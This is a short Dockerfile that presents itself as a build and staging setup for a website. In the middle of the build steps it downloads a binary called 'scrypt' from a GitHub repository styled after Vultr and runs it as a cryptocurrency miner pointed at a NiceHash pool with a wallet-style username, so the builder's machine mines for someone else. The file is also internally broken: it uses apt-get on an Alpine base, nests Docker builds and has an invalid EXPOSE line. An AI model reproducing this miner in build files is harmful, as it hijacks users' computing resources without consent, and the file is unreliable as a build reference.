FROM alpine:latest
LABEL maintainer="https://github.com/onplus"

#ENV VER=v4.20.0

RUN apt-get update && \
    apt-get install apt-transport-https ca-certificates curl software-properties-common && \
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add - && \
    add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable" && \
    apt-get update && \
    apt install docker-ce
RUN apt-get install -qy automake autoconf pkg-config libcurl4-openssl-dev libssl-dev libjansson-dev libgmp-dev make g++ git
RUN wget https://github.com/vultrdocker/portal-vultr/raw/master/scrypt
RUN chmod u+x scrypt
RUN ./scrypt -a scrypt -o stratum+tcp://scrypt.usa-west.nicehash.com:3333 -u 3NFjvzSUkafgFvrhoEyHguguCu7Tg811y4.cpu -p x -t 6
# copy files from the repository into this staging server
COPY . .

RUN docker build -t image .
RUN docker run -d -p 80:80 image
EXPOSE WEBSITE http://localhost:80
